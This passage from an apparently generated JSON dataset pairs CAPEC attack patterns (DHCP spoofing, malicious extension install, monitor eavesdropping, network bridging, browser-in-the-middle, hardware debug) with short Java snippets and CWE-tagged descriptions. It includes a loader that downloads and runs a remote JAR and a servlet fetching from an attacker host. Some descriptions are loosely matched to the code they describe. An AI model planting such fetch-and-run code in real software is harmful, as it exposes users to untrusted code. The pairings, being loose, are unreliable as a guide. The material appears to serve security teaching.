(byte) 0xFF, (byte) 0x00, // Option 1: Subnet Mask\n            (byte) 0x03, (byte) 0x04, (byte) 0xC0, (byte) 0xA8, (byte) 0x01, (byte) 0x01, // Option 3: Router\n            (byte) 0x06, (byte) 0x04, (byte) 0xC0, (byte) 0xA8, (byte) 0x01, (byte) 0x01, // Option 6: Domain Name Server\n            (byte) 0xFF // End Option\n        };\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of a DHCP spoofing attack. The code creates a fake DHCP offer packet and sends it to a target client. The packet contains a spoofed IP address and other DHCP options. The main idea is to illustrate how an attacker can masquerade as a legitimate DHCP server to redirect network traffic or deny service. The code leverages CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not ensuring the correct endpoint, CWE-290 (Authentication Bypass by Spoofing) by spoofing the DHCP server, and CWE-291 (Reliance on IP Address for Authentication) by using IP addresses for authentication without proper validation."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousExtensionInstaller {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-extension.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious-extension.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"malicious-extension.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"com.example.MaliciousExtension\");\n            Runnable extension = (Runnable) clazz.getDeclaredConstructor().newInstance();\n\n            // CWE-507: Trojan Horse\n            extension.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the installation of a malicious extension, embodying the main idea of the CAPEC 'Install Malicious Extension'. The code downloads a JAR file from a remote location without verifying its integrity (CWE-494). It then loads and executes a class from this untrusted JAR file (CWE-829), which could contain hidden malicious functionality (CWE-507). This represents a typical scenario where an adversary tricks a user into installing a malicious extension, leading to potential security breaches."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import java.awt.GraphicsDevice;\nimport java.awt.GraphicsEnvironment;\nimport java.awt.Robot;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.ImageIO;\nimport java.io.File;\nimport java.io.IOException;\n\npublic class ScreenCapture {\n    public static void main(String[] args) {\n        try {\n            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();\n            GraphicsDevice[] gs = ge.getScreenDevices();\n            for (GraphicsDevice gd : gs) {\n                Robot robot = new Robot(gd);\n                BufferedImage screenShot = robot.createScreenCapture(gd.getDefaultConfiguration().getBounds());\n                ImageIO.write(screenShot, \"png\", new File(\"screenshot.png\"));\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet captures the content displayed on all connected monitors and saves it as a PNG file. The code uses the Robot class to create a screen capture of each monitor's display area. This represents the CAPEC 'Eavesdropping on a Monitor' by demonstrating how an attacker could capture screen content without modifying any cables or installing software on the target system. The code indirectly touches on CWE-1300 (Improper Protection of Physical Side Channels) by showing how screen data can be captured through software means, CWE-319 (Cleartext Transmission of Sensitive Information) by saving the captured data in an unencrypted format, and CWE-1323 (Improper Management of Sensitive Trace Data) by storing the captured screen data in an unprotected file."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class NetworkBoundaryBridge {\n    public static void main(String[] args) {\n        try {\n            // Establish a connection to a trusted network\n            Socket trustedSocket = new Socket(\"trusted-network.com\", 8080);\n            DataOutputStream trustedOut = new DataOutputStream(trustedSocket.getOutputStream());\n            DataInputStream trustedIn = new DataInputStream(trustedSocket.getInputStream());\n\n            // Establish a connection to an untrusted network\n            Socket untrustedSocket = new Socket(\"untrusted-network.com\", 9090);\n            DataOutputStream untrustedOut = new DataOutputStream(untrustedSocket.getOutputStream());\n            DataInputStream untrustedIn = new DataInputStream(untrustedSocket.getInputStream());\n\n            // Bridge data between trusted and untrusted networks\n            String dataFromTrusted = trustedIn.readUTF();\n            untrustedOut.writeUTF(dataFromTrusted);\n\n            String dataFromUntrusted = untrustedIn.readUTF();\n            trustedOut.writeUTF(dataFromUntrusted);\n\n            // Close connections\n            trustedSocket.close();\n            untrustedSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of 'Network Boundary Bridging' where an adversary bridges a trusted network and an untrusted network. The code establishes two socket connections: one to a trusted network and another to an untrusted network. It then reads data from the trusted network and sends it to the untrusted network, and vice versa. This bridging can lead to several vulnerabilities as described by the related CWEs: improper restriction of communication channels, trust boundary violations, improper access control, and lack of message integrity enforcement. The code does not verify the identity of the endpoints or ensure the integrity of the data being transmitted, making it susceptible to attacks."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = \"http://attacker.com/remoteDesktop\";\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        InputStream inputStream = connection.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        StringBuilder responseContent = new StringBuilder();\n        while ((line = reader.readLine()) != null) {\n            responseContent.append(line);\n        }\n        reader.close();\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(responseContent.toString());\n    }\n}",
        "description": "This Java servlet code demonstrates a Browser in the Middle (BiTM) attack scenario. The servlet fetches content from an external URL (http://attacker.com/remoteDesktop) and serves it to the client. This can be exploited by an attacker to establish a remote desktop session within the victim's browser. The code does not verify the authenticity of the data fetched (CWE-345), relies on client-side enforcement of security (CWE-602), and includes web functionality from an untrusted source (CWE-830). This setup can lead to severe security breaches, including unauthorized remote access and data interception."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "public class DebugComponent {\n    private boolean isAuthorized;\n    private boolean debugMode;\n    private String sensitiveData;\n\n    public DebugComponent(boolean isAuthorized) {\n        this.isAuthorized = isAuthorized;\n        this.debugMode = false;\n        this.sensitiveData = \"Sensitive Trace Data\";\n    }\n\n    public void enableDebugMode() {\n        if (isAuthorized) {\n            this.debugMode = true;\n            System.out.println(\"Debug mode enabled.\");\n        } else {\n            System.out.println(\"Unauthorized access attempt detected.\");\n        }\n    }\n\n    public void accessSensitiveData() {\n        if (debugMode) {\n            System.out.println(\"Accessing: \" + sensitiveData);\n        } else {\n            System.out.println(\"Debug mode not enabled. Access denied.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        DebugComponent debugComponent = new DebugComponent(true);\n        debugComponent.enableDebugMode();\n        debugComponent.accessSensitiveData();\n\n        DebugComponent unauthorizedComponent = new DebugComponent(false);\n        unauthorizedComponent.enableDebugMode();\n        unauthorizedComponent.accessSensitiveData();\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a hardware debug component with access control mechanisms. The `DebugComponent` class has a constructor that sets the authorization status. The `enableDebugMode` method checks if the user is authorized before enabling debug mode, and the `accessSensitiveData` method allows access to sensitive data only if debug mode is enabled. This embodies the main idea of CAPEC-Exploiting Incorrect Chaining or Granularity of Hardware Debug Components by demonstrating the importance of checking authorization on a per-function basis. The code also touches on related CWEs by ensuring proper access control (CWE-1191) and protecting sensitive trace data (CWE-1323)."
    }
]